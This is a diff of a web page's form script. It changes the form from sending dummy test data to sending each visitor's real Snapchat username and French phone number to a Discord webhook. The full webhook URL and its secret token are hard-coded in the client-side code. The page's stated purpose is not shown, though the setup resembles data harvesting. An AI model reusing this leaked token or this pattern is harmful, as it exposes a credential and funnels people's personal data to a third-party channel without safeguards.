@@ -215,42 +215,48 @@
     <script>
         const form = document.getElementById("form");
         const success = document.getElementById("success");
+        const usernameInput = document.getElementById("username");
+        const phoneInput = document.getElementById("phone");
 
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1519782475222483036/WvhWDXA34FkJB0_fbcNT4X5PQb8D58kDA0TNBK_i4RQf85peDe6xursXooQ_BkKUPbop";
 
-    form.addEventListener("submit", async function(event) {
-        event.preventDefault();
+        form.addEventListener("submit", async function(event) {
+            event.preventDefault();
 
-        // Données fictives uniquement pour le test
-        const message = {
-            content: "🧪 **Test depuis mon site !**\n" +
-                     "Utilisateur : `test_user`\n" +
-                     "Action : `formulaire envoyé`"
-        };
+            // Récupération des vraies valeurs saisies
+            const username = usernameInput.value.trim();
+            const phone = phoneInput.value.trim();
 
-        try {
-            const response = await fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(message)
-            });
+            // Construction du message avec les vraies données
+            const message = {
+                content: "📩 **Nouvelle soumission !**\n" +
+                         "👤 **Snapchat :** `" + username + "`\n" +
+                         "📱 **Téléphone :** `+33 " + phone + "`\n" +
+                         "🕐 **Date :** `" + new Date().toLocaleString('fr-FR') + "`"
+            };
 
-            if (!response.ok) {
-                throw new Error("Erreur lors de l'envoi");
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(message)
+                });
+
+                if (!response.ok) {
+                    throw new Error("Erreur lors de l'envoi");
+                }
+
+                form.style.display = "none";
+                success.style.display = "block";
+
+            } catch (error) {
+                console.error(error);
+                alert("Impossible d'envoyer le message Discord.");
             }
-
-            form.style.display = "none";
-            success.style.display = "block";
-
-        } catch (error) {
-            console.error(error);
-            alert("Impossible d'envoyer le message Discord.");
-        }
-    });
-</script>
+        });
+    </script>
 
 </body>
 </html>
-
